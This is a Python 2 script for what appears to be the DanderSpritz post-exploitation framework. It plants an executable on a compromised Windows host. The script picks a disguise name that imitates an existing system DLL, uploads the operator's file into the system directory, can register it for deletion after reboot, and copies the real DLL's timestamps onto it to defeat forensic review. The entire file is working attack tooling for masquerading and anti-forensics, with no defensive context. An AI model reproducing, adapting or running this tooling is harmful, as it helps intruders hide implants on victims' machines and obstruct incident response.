
import dsz, dsz.windows, dsz.lp, random, sys
import dsz.ui
systempath = dsz.path.windows.GetSystemPath()
exe_trunk = []
dll_trunk = []

def findnames():
    dsz.control.echo.Off()
    cmd = ('dir -mask *.dll -path ' + systempath)
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dll_list = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    for dll in dll_list:
        dll_trunk.append(dll.lower().replace('.dll', ''))
    cmd = ('dir -mask *.exe -path ' + systempath)
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    exe_list = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
    for exe in exe_list:
        exe_trunk.append(exe.lower().replace('.exe', ''))
    for dll in dll_trunk:
        if (dll in exe_trunk):
            dll_trunk.remove(dll)

def getrandomlist():
    random_dll = []
    for i in range(10):
        if (len(dll_trunk) == 0):
            break
        randnum = random.randint(0, (len(dll_trunk) - 1))
        random_dll.append(dll_trunk[randnum])
        dll_trunk.remove(dll_trunk[randnum])
    return random_dll

def printmenu(dlls):
    print '0: Exit'
    for dll in dll_list:
        print ((str((dll_list.index(dll) + 1)) + ': ') + dll)
    print '11: Try 10 more names'
    return int(raw_input('Please pick the number of the name you want for your executable: '))
findnames()
number = 11
dll_list = getrandomlist()
while (number > 10):
    try:
        number = printmenu(dll_list)
    except:
        print 'Error with your input, did you enter a number?'
        continue
    if (number == 0):
        print 'Exiting'
        sys.exit((-1))
    elif (number == 11):
        dll_list = getrandomlist()
dll = dll_list.pop((int(number) - 1))
sourcepath = raw_input('Please enter the full path to your exe to upload: ')
destfilename = (((systempath + '\\') + dll) + '.exe')
answer = dsz.ui.Prompt('Do you want to do a del -afterreboot of this first?')
if answer:
    print ('Running "pfroadd %s"' % destfilename)
    dsz.cmd.Run(('pfroadd %s' % destfilename))
    print ('Run "pfroremove %s" when done to clean up' % destfilename)
cmd = ('put "%s" -name "%s"' % (sourcepath, destfilename))
if (not dsz.cmd.Run(cmd)):
    dsz.ui.Echo('Error putting file, quitting', dsz.ERROR)
    sys.exit((-1))
cmd = (((((((('matchfiletimes -src ' + systempath) + '\\') + dll) + '.dll -dst ') + systempath) + '\\') + dll) + '.exe')
if (not dsz.cmd.Run(cmd)):
    dsz.ui.Echo('Error matching times, quitting', dsz.ERROR)
    sys.exit((-1))